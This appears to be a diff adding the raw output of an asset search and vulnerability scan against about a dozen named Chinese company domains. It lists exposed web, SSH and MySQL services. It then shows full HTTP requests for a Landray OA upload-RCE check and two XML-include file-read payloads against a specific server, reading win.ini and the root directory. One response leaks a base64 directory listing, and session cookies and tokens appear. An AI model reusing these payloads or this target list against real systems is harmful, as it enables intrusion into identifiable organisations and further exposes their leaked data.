@@ -1,0 +1,192 @@
+[+] 本次搜索关键字为：domain="zjpinchuan.com" || domain="zjsyqj.com" || domain="woluoda.com" || domain="xiebaotong.com" || domain="hzwjjx.cn" || domain="physicalpoint.com" || domain="checrc.com" || domain="tantooau.com" || domain="hzyuanfan.cn" || domain="zjcct.com" || domain="autohz.cn" || domain="rimaotong.com"
+https://www.physicalpoint.com  杭州物点网络科技有限公司   中国, Hangzhou
+http://www.physicalpoint.com   杭州物点网络科技有限公司   中国, Hangzhou
+http://static.rimaotong.com    403Forbidden               中国, Hangzhou
+http://www.rimaotong.com       日贸通官网——让中日之间没有难做的生意 中国, Hangzhou
+https://wyzp.physicalpoint.com 五育综合素质评价平台       中国, Hangzhou
+https://jqxcx.hzyuanfan.cn:6443 HTTPS                      中国, Hangzhou
+http://jqxcx.hzyuanfan.cn:32400 404:NotFound               中国, Hangzhou
+https://courtyardtest.checrc.com 千村万链基础数据管理平台   中国, Hangzhou
+http://courtyardtest.checrc.com 千村万链基础数据管理平台   中国, Hangzhou
+https://jiaoan.physicalpoint.com 慧编AI教案                 中国, Hangzhou
+ssh://www.rimaotong.com:22     SSH                        中国, Hangzhou
+ssh://static.rimaotong.com:22  SSH                        中国, Hangzhou
+https://ncjsxy-fk.physicalpoint.com 南昌技师学院访客系统       中国, Hangzhou
+http://jqxcx.hzyuanfan.cn:30050 404:NotFound               中国, Hangzhou
+http://customer.rimaotong.com  ホーム                     中国, Hangzhou
+mysql://customer.rimaotong.com:3306 MYSQL                      中国, Hangzhou
+mysql://www.rimaotong.com:3306 MYSQL                      中国, Hangzhou
+http://erp.checrc.com:9081     登录系统                   中国, Hangzhou
+http://m.hzwjjx.cn             nba直播_nba直播在线观看_nba直播高清无插件(免费)_24直播网 中国, Ningbo
+https://zjcct.com              403Forbidden               中国香港特别行政区, Hong Kong
+https://www.zjcct.com          403Forbidden               中国香港特别行政区, Hong Kong
+http://zjcct.com               403Forbidden               中国香港特别行政区, Hong Kong
+http://www.zjcct.com           403Forbidden               中国香港特别行政区, Hong Kong
+https://www.hzwjjx.cn          HTTPS                      中国, Ningbo
+http://www.hzwjjx.cn           HTTP                       中国, Ningbo
+https://m.hzwjjx.cn            nba直播_nba直播在线观看_nba直播高清无插件(免费)_24直播网 中国, Ningbo
+https://hzwjjx.cn              301MovedPermanently        中国, Ningbo
+http://hzwjjx.cn               301MovedPermanently        中国, Ningbo
+mysql://static.rimaotong.com:3306 MYSQL                      中国, Hangzhou
+https://etu.physicalpoint.com  403Forbidden               中国, Hangzhou
+http://login-ppoa.physicalpoint.com 登录                       中国, Hangzhou
+http://daily-ppoa.physicalpoint.com 物点OA                     中国, Hangzhou
+https://daily-ppoa.physicalpoint.com 物点OA                     中国, Hangzhou
+http://sso-ppoa.physicalpoint.com 统一认证平台               中国, Hangzhou
+https://login-ppoa.physicalpoint.com 登录                       中国, Hangzhou
+https://sso-ppoa.physicalpoint.com 统一认证平台               中国, Hangzhou
+http://erp.checrc.com:8186     HTTP                       中国, Hangzhou
+https://demohengdian.physicalpoint.com 南昌技师学院访客系统       中国, Hangzhou
+http://qhjtlenglian2.physicalpoint.com 301MovedPermanently        中国, Hangzhou
+https://qhjtchengpei.physicalpoint.com 城配管理系统               中国, Hangzhou
+https://qhjtlenglian2.physicalpoint.com 冷链运输管理系统           中国, Hangzhou
+http://qhjtchengpei.physicalpoint.com 301MovedPermanently        中国, Hangzhou
+http://demohengdian.physicalpoint.com 301MovedPermanently        中国, Hangzhou
+http://www.zjsyqj.com          浙江圣宇-电缆桥架-防爆配电箱-母线槽厂家-抗震支架价格 中国, Hangzhou
+https://www.zjsyqj.com         浙江圣宇-电缆桥架-防爆配电箱-母线槽厂家-抗震支架价格 中国, Hangzhou
+[+] 本次搜索，返回结果总条数为：45,此次返回条数为：45
+http://static.rimaotong.com              🤓 
+https://wyzp.physicalpoint.com           🤓 nginx
+https://www.physicalpoint.com            🤓 nginx;Echarts
+http://jqxcx.hzyuanfan.cn:32400          🤓 
+http://www.physicalpoint.com             🤓 nginx;Echarts
+https://jqxcx.hzyuanfan.cn:6443          🤓 
+http://courtyardtest.checrc.com          🤓 nginx
+https://courtyardtest.checrc.com         🤓 nginx
+http://www.rimaotong.com                 🤓 yii;Bootstrap
+http://jqxcx.hzyuanfan.cn:30050          🤓 
+https://jiaoan.physicalpoint.com         🤓 nginx
+http://m.hzwjjx.cn                       🤓 nginx
+http://erp.checrc.com:9081               🤓 landray
+https://zjcct.com                        🤓 nginx
+http://zjcct.com                         🤓 nginx
+http://www.zjcct.com                     🤓 nginx
+https://www.zjcct.com                    🤓 nginx
+https://etu.physicalpoint.com            🤓 nginx
+http://login-ppoa.physicalpoint.com      🤓 nginx
+https://www.hzwjjx.cn                    🤓 nginx;Bootstrap
+http://www.hzwjjx.cn                     🤓 nginx;Bootstrap
+http://daily-ppoa.physicalpoint.com      🤓 nginx
+https://daily-ppoa.physicalpoint.com     🤓 nginx
+https://login-ppoa.physicalpoint.com     🤓 nginx
+http://sso-ppoa.physicalpoint.com        🤓 nginx
+https://m.hzwjjx.cn                      🤓 nginx;Bootstrap
+https://sso-ppoa.physicalpoint.com       🤓 nginx
+https://hzwjjx.cn                        🤓 nginx;Bootstrap
+http://erp.checrc.com:8186               🤓 
+http://hzwjjx.cn                         🤓 nginx;Bootstrap
+https://demohengdian.physicalpoint.com   🤓 nginx
+http://qhjtlenglian2.physicalpoint.com   🤓 nginx;Echarts
+https://qhjtchengpei.physicalpoint.com   🤓 nginx
+https://qhjtlenglian2.physicalpoint.com  🤓 nginx
+http://qhjtchengpei.physicalpoint.com    🤓 nginx;Echarts
+http://demohengdian.physicalpoint.com    🤓 nginx;Echarts
+http://www.zjsyqj.com                    🤓 OpenResty
+https://www.zjsyqj.com                   🤓 OpenResty
+[vuln] [critical] [landary-oa-sysuicomponent-fileupload] [landray, oa, treexml, rce, vuln] http://erp.checrc.com:9081/resource/ui-component/2023/timestamps.jsp
+================  请求数据包 ================
+GET /resource/ui-component/2023/timestamps.jsp HTTP/1.1
+Host: erp.checrc.com:9081
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+Connection: close
+Cookie: SESSION=MjZhZWU1ZTAtZjU4YS00OGMyLWIwZTktZGY3YTAwYzlhNjJl
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 
+Connection: close
+Content-Length: 8
+Access-Control-Allow-Origin: *
+Content-Type: text/html;charset=ISO-8859-1
+Date: Mon, 30 Mar 2026 02:12:49 GMT
+
+400841
+
+============================================
+[vuln] [high] [lanling-oa-sysFormMainDataInsystemWebservice-fileread] [landray, lfi, landray-eis] http://erp.checrc.com:9081/sys/webservice/sysFormMainDataInsystemWebservice
+================  请求数据包 ================
+POST /sys/webservice/sysFormMainDataInsystemWebservice HTTP/1.1
+Host: erp.checrc.com:9081
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 567
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/related; boundary=----gspzkmf340hxiggreqdr
+SOAPAction: ""
+
+------gspzkmf340hxiggreqdr
+Content-Disposition: form-data; name="a"
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.maindata.xform.sys.kmss.landray.com/">
+<soapenv:Header/>
+<soapenv:Body>
+    <web:getData>
+        <arg0>
+            <beginTimeStamp>a</beginTimeStamp>
+            <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
+        </arg0>
+    </web:getData>
+</soapenv:Body>
+</soapenv:Envelope>
+------gspzkmf340hxiggreqdr--
+
+================  请求响应包 ================
+HTTP/1.1 500 
+Connection: close
+Content-Length: 289
+Access-Control-Allow-Origin: *
+Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'
+Content-Type: text/xml;charset=UTF-8
+Date: Mon, 30 Mar 2026 02:12:49 GMT
+Set-Cookie: SESSION=ZjJjNDBjMDItMGEyMS00YjkyLTk4ODktOThmM2FlYmU4NzZl; Path=/; HttpOnly; SameSite=Lax
+X-Auth-Token: f2c40c02-0a21-4b92-9889-98f3aebe876e
+X-Xss-Protection: 0
+
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Client</faultcode><faultstring>Unmarshalling Error: 意外的元素 (uri:"", local:"beginTimeStamp")。所需元素为(none) </faultstring></soap:Fault></soap:Body></soap:Envelope>
+============================================
+[vuln] [high] [lanling-oa-thirdImSyncForKKWebService-fileread] [landray, lfi, landray-eis] http://erp.checrc.com:9081/sys/webservice/thirdImSyncForKKWebService
+================  请求数据包 ================
+POST /sys/webservice/thirdImSyncForKKWebService HTTP/1.1
+Host: erp.checrc.com:9081
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/3.6.8
+Connection: close
+Content-Length: 546
+Content-Type: multipart/related; boundary=----xxbmlbpaztyslbovlhjq
+SOAPAction: ""
+Accept-Encoding: gzip
+
+------xxbmlbpaztyslbovlhjq
+Content-Disposition: form-data; name="a"
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.kk.im.third.kmss.landray.com/">
+<soapenv:Header/>
+<soapenv:Body>
+<web:getTodo>
+<arg0>
+<otherCond>1</otherCond>
+<pageNo>1</pageNo>
+<rowSize>1</rowSize>
+<targets>1</targets>
+<type><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///"/></type>
+</arg0>
+</web:getTodo>
+</soapenv:Body>
+</soapenv:Envelope>
+------xxbmlbpaztyslbovlhjq--
+
+================  请求响应包 ================
+HTTP/1.1 500 
+Connection: close
+Content-Length: 679
+Access-Control-Allow-Origin: *
+Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'
+Content-Type: text/xml;charset=UTF-8
+Date: Mon, 30 Mar 2026 02:12:49 GMT
+Set-Cookie: SESSION=NTQ5ZDI2MzMtNWFiNy00ZGM0LWJjMDYtMThiNmJkMzBiZmM5; Path=/; HttpOnly; SameSite=Lax
+X-Auth-Token: 549d2633-5ab7-4dc4-bc06-18b6bd30bfc9
+X-Xss-Protection: 0
+
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Client</faultcode><faultstring>Unmarshalling Error: Not a number: JFJFQ1lDTEUuQklOCmFwcApjbl9zcWxfc2VydmVyXzIwMDhfcjJfc3RhbmRhcmRfeDg2X3g2NF9pYTY0X2R2ZF81MjIyMzkKZGF0YWJhc2VfYmFrX2RheQpkYXRhYmFzZV9iYWtfeXVlCmRhdGFlYXNlLW9mZmxpbmUtaW5zdGFsbGVyLXYyLjEwLjYtY2UudGFyLmd6CkR1bXBTdGFjay5sb2cudG1wCmVrcApraW5nZGVlLWJhawpsYW5kcmF5Cm15c3FsCnJlc291cmNlClN1bmxvZ2luQ2xpZW50XyAxNS4zLjIuNjI5MTlfeDY0LmV4ZQpTeW5jQmFja1BybyB2MTEuMi56aXAKU3lzdGVtIFZvbHVtZSBJbmZvcm1hdGlvbgrK17TOvfi0xcXMz8i/tLG+zsS8/i3W2NKqzOHKvi50eHQKzsS8/rD8Cg== </faultstring></soap:Fault></soap:Body></soap:Envelope>
+============================================
+https://wyzp.physicalpoint.com/cqes      🤓 nginx
